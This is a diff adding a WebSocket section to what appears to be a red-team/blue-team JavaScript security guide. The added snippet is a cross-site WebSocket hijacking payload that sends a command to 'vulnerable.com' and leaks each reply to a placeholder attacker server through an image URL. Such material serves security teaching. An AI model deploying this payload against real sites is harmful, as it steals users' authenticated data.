@@ -6,6 +6,7 @@
 4. [CSRF](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#csrf)
 5. [NORMALIZE STRING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#normalize-string)
 6. [MEASURE PERFORMANCE (SIDE CHANNEL ATTACK)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#measure-performance)
+7. [WEBSOCKET](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#websocket)
 
 <br />
 
@@ -149,3 +150,21 @@ while (i < str.length) {
 </body>
 </html>
 ```
+
+## WEBSOCKET
+```
+<html>
+<body>
+<script>
+var uri      = "ws://vulnerable.com/";
+var ws       = new WebSocket(uri);
+
+ws.onmessage = function(message) {
+  document.write('<img src="http://yourMaliciousServer/?c='+message.data+'" />');
+};
+
+ws.onopen = () => ws.send("COMMAND");
+
+</script>
+</body>
+</html>
